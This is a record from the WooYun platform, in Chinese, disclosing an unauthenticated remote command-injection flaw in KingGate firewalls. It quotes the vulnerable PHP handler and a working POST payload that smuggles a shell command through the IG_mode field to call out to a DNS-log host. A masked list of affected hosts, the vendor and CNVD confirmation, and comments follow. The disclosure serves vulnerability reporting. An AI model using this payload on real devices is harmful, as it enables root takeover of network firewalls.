{"id": 87146, "wybug_id": "wooyun-2016-0178456", "wybug_title": "某防火墙远程命令执行（cloudeye演示实例）", "wybug_corp": "cncert", "wybug_author": "老虎皮", "wybug_date": "2016-02-25 01:50", "wybug_open_date": "2016-05-26 19:00", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-29：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向公众公开  简要描述： 厂商说不管，请管理员交给cert处理 详细说明：  无需登录，远程任意命令执行（root权限)，直接撸穿源代码，随意控制防火墙无需登录，远程任意命令执行（root权限)，直接撸穿源代码，随意控制防火墙  该设计缺陷新旧版本的KingGate防火墙通杀 \n\n \n\n 通过案例一 **.**.**.**/bugs/wooyun-2016-0176999  我已经撸到了源代码 在对源代码审计过程中发现一枚无需登录的远程命令执行漏洞 在src/frame/status_JobModeSet.php \nrequire(\"../lib/public.inc\");require(\"../lib/zone_single_group.inc\");if ($_SERVER['REQUEST_METHOD'] == \"POST\"){\t$IG_mode = $_POST['IG_mode'];\t$selejobmode = trim($_POST['selejobmode']);\t$selearray = explode(\"/\", $selejobmode);\t$speed = $selearray[0];\t$duplex = $selearray[1];\t\t$config_dir = \"/etc/infogate/network/mode\";\t$config_file = $config_dir.\"/eth\".$IG_mode;\tif(!is_dir($config_dir))\t{\t\tsystem(\"mkdir $config_dir >/dev/null 2/dev/null\");\t}\tif(!file_exists($config_file))\t{\t\tsystem(\"touch $config_file >/dev/null 2/dev/null\");\t}\n关键代码\nif(!file_exists($config_file))\t{\t\tsystem(\"touch $config_file >/dev/null 2/dev/null\");\t}\n其中$config_file又来自于 \n$config_file = $config_dir.\"/eth\".$IG_mode;\n而$IG_mode又来自于 \n$IG_mode = $_POST['IG_mode'];\n所以只要我们构造好特殊的命令即可执行**.**.**.**/src/frame/status_JobModeSet.phppostdata   IG_mode=a|ping woainiwooyun123.118e1c.dnslog.info -c 10 ||\n\n\n\n\n\n受影响的如下列表：**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php   漏洞证明：   通过案例一 **.**.**.**/bugs/wooyun-2016-0176999  我已经撸到了源代码 在对源代码审计过程中发现一枚无需登录的远程命令执行漏洞 在src/frame/status_JobModeSet.php \nrequire(\"../lib/public.inc\");require(\"../lib/zone_single_group.inc\");if ($_SERVER['REQUEST_METHOD'] == \"POST\"){\t$IG_mode = $_POST['IG_mode'];\t$selejobmode = trim($_POST['selejobmode']);\t$selearray = explode(\"/\", $selejobmode);\t$speed = $selearray[0];\t$duplex = $selearray[1];\t\t$config_dir = \"/etc/infogate/network/mode\";\t$config_file = $config_dir.\"/eth\".$IG_mode;\tif(!is_dir($config_dir))\t{\t\tsystem(\"mkdir $config_dir >/dev/null 2/dev/null\");\t}\tif(!file_exists($config_file))\t{\t\tsystem(\"touch $config_file >/dev/null 2/dev/null\");\t}\n关键代码\nif(!file_exists($config_file))\t{\t\tsystem(\"touch $config_file >/dev/null 2/dev/null\");\t}\n其中$config_file又来自于 \n$config_file = $config_dir.\"/eth\".$IG_mode;\n而$IG_mode又来自于 \n$IG_mode = $_POST['IG_mode'];\n所以只要我们构造好特殊的命令即可执行**.**.**.**/src/frame/status_JobModeSet.phppostdata   IG_mode=a|ping woainiwooyun123.118e1c.dnslog.info -c 10 ||\n\n\n\n\n\n受影响的如下列表：**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php   修复方案：     版权声明：转载请注明来源 老虎皮@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2016-02-26 18:51 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-25 11:57 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:68        | 我要是再正常一点就好了)\t\t \n  卧槽，好牛啊    \n     2016-03-01 06:54 |    \t\tsangfor.org \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:25        | 天下熙熙，皆为利来；天下攘攘，皆为利往...)\t\t \n  赞    \n     2016-03-01 09:56 |    \t\t枫子 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | 酱油安全爱好者一枚。)\t\t \n  学习围观    \n     2016-03-02 16:45 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 你猜)\t\t \n  到底是哪家厂商？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}